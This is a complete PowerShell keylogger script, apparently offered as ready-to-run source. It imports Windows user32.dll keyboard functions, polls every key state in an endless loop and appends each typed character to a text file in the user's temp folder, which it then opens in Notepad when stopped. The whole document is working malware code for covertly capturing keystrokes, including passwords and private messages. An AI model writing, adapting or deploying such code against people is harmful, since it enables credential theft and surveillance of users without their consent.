#requires -Version 2
function Start-KeyLogger
{
    param(
        [string]$Path = "$env:temp\keylogger.txt"
    )
    
    # Signatures for API Calls
    $signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError = true)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff, int cchBuff, uint wFlags);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError = true)]
    public static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError = true)]
    public static extern uint MapVirtualKey(uint uCode, MapType uMapType);
    '@

    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    # Define enumeration for MapVirtualKey
    Add-Type -TypeDefinition @"
    public enum MapType : uint {
        VirtualKeyToScanCode = 0,
        ScanCodeToVirtualKey = 1,
        VirtualKeyToChar = 2,
        ScanCodeToChar = 3,
    }
    "@

    # Create output file
    New-Item -Path $Path -ItemType File -Force

    try {
        Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red

        # Record all key presses until script is stopped
        while ($true) {
            Start-Sleep -Milliseconds 40

            for ($ascii = 9; $ascii -le 254; $ascii++) {
                $state = $API::GetAsyncKeyState($ascii)

                if ($state -eq -32767) {
                    $kbState = New-Object Byte[] 256
                    $API::GetKeyboardState($kbState)

                    $virtualKey = $API::MapVirtualKey($ascii, [API.MapType]::ScanCodeToVirtualKey)

                    $char = New-Object System.Text.StringBuilder 64
                    $success = $API::ToUnicode($virtualKey, $ascii, $kbState, $char, $char.Capacity, 0)

                    if ($success) {
                        [System.IO.File]::AppendAllText($Path, $char.ToString(), [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally {
        # Open logger file in Notepad
        notepad $Path
    }
}

Start-KeyLogger
